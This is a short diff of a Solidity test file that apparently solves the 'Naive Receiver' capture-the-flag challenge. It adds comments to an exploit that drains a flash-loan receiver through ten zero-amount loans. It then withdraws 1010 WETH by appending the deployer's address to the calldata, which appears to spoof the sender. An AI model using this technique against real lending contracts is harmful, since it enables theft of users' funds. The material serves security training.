@@ -79,10 +79,12 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
         bytes[] memory data = new bytes[](11);
+        // transfer total fee 10 WETH to pool
         for (uint i = 0; i < 10; i++) {
             // memory:[4 bytes selector][32 bytes receiver][32 bytes token][32 bytes amount][bytes data]
             data[i] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 0, ""));
         }
+        // transfer 1000e18 and 10e18 weth to recovery
         // memory:[4 bytes selector][32 bytes amount][32 bytes receiver][32 bytes deployer]
         data[10] = abi.encodeWithSignature("withdraw(uint256,address)", 1010e18, payable(recovery), deployer);
 
